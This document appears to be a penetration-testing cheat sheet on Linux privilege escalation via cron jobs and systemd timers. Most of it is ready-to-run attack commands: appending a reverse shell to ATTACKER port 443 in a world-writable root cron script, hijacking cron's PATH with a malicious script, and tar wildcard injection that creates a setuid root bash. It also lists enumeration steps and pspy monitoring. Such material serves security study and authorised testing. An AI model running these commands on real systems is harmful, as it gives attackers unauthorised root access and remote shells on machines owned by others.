# CRON JOBS

### System cron jobs

Scheduled tasks — Scripts running as root

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
crontab -l -u <user>
```

<details>
<summary>Example Output</summary>

```
cat /etc/crontab
* * * * * root /opt/backup.sh
*/5 * * * * root /usr/local/bin/cleanup.py

ls -la /opt/backup.sh
-rwxrwxrwx 1 root root  <- WORLD WRITABLE!
```
</details>

---

### Writable cron scripts

Modify script to add reverse shell — Runs as the cron user (often root)

```bash
Check if you can write to scripts in crontab
```

<details>
<summary>Example Output</summary>

```
cat /etc/crontab:
* * * * * root /opt/backup.sh

ls -la /opt/backup.sh:
-rwxrwxrwx 1 root root

echo 'bash -i >& /dev/tcp/ATTACKER/443 0>&1' >> /opt/backup.sh
(Wait 1 minute for root reverse shell)
```
</details>

---

### Cron PATH abuse

Script name matches cron command — Cron runs your script instead

```bash
If cron has custom PATH:
Create malicious script in earlier PATH dir
```

<details>
<summary>Example Output</summary>

```
cat /etc/crontab:
PATH=/home/user:/usr/local/sbin:/usr/local/bin
* * * * * root backup

echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1' > /home/user/backup
chmod +x /home/user/backup
(Cron finds your script first in PATH)
```
</details>

---

### Cron wildcard injection

tar/rsync wildcard abuse — Filenames become command arguments

```bash
If cron runs: tar czf /tmp/backup.tar.gz *
Create files: --checkpoint=1 --checkpoint-action=exec=shell.sh
```

<details>
<summary>Example Output</summary>

```
Crontab: * * * * * root cd /var/www && tar czf /tmp/backup.tar.gz *

cd /var/www
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

Wait 1 min, then:
/tmp/rootbash -p
# whoami
root
```
</details>

---

### Monitor for hidden cron

Processes not visible in crontab — System timers, at jobs

```bash
pspy64 or pspy32 (run for 5 min)
```

<details>
<summary>Example Output</summary>

```
pspy64 output:
CMD: UID=0 PID=1234 | /bin/bash /root/secret_script.sh
CMD: UID=0 PID=1235 | /usr/bin/python3 /opt/hidden_task.py
(Found cron jobs not in crontab)
```
</details>

---

### Systemd timers

Modern cron replacement — Check associated service files

```bash
systemctl list-timers --all
```

<details>
<summary>Example Output</summary>

```
systemctl list-timers
NEXT          LEFT      UNIT
Mon 10:00     2min      backup.timer

cat /etc/systemd/system/backup.service
ExecStart=/opt/backup.sh
(Check if backup.sh is writable)
```
</details>

---
